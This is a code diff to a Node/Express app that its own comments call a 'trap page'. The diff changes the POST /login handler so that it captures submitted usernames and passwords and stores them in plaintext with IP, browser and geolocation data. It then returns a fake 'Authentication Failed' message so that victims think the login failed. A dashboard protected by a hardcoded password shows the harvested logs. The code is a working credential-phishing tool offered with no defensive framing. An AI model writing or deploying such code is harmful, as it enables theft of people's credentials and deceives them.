@@ -11,7 +11,7 @@ const LOG_FILE = path.join(__dirname, 'logs.json');
 
 // Middleware setup
 app.use(useragent.express());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.urlencoded({ extended: true })); // Crucial for reading form data
 
 // Helper function to read and append logs to file
 function saveLog(newLog) {
@@ -28,31 +28,8 @@ function saveLog(newLog) {
     fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
 }
 
-// Public Trap Page (Root)
+// Public Trap Page (Root) - Just logs the visit
 app.get('/', async (req, res) => {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const ua = req.useragent;
-    
-    let geoData = {};
-    try {
-        const response = await axios.get(`http://ip-api.com/json/${ip}`);
-        geoData = response.data;
-    } catch (err) {
-        console.error('IP lookup failed:', err.message);
-    }
-
-    const logEntry = {
-        time: new Date().toISOString(),
-        ip,
-        browser: ua.browser,
-        os: ua.os,
-        device: ua.platform,
-        location: geoData
-    };
-
-    // Save to file instead of memory array
-    saveLog(logEntry);
-
     res.send(`
         <!DOCTYPE html>
         <html>
@@ -69,11 +46,38 @@ app.get('/', async (req, res) => {
     `);
 });
 
-app.post('/login', (req, res) => {
+// Capture credentials when the form is submitted
+app.post('/login', async (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const ua = req.useragent;
+    const { username, password } = req.body; // Extract submitted credentials
+
+    let geoData = {};
+    try {
+        const response = await axios.get(`http://ip-api.com/json/${ip}`);
+        geoData = response.data;
+    } catch (err) {
+        console.error('IP lookup failed:', err.message);
+    }
+
+    const logEntry = {
+        time: new Date().toISOString(),
+        ip,
+        username,  // Captured username
+        password,  // Captured password
+        browser: ua.browser,
+        os: ua.os,
+        device: ua.platform,
+        location: geoData
+    };
+
+    saveLog(logEntry);
+
+    // Show fake error so they think login failed
     res.send('<h3>Authentication Failed. Please try again.</h3>');
 });
 
-// Protected Admin Dashboard (Reads directly from file)
+// Protected Admin Dashboard
 app.get('/dashboard', basicAuth({
     users: { 'admin': 'SuperSecretPassword123' },
     challenge: true,
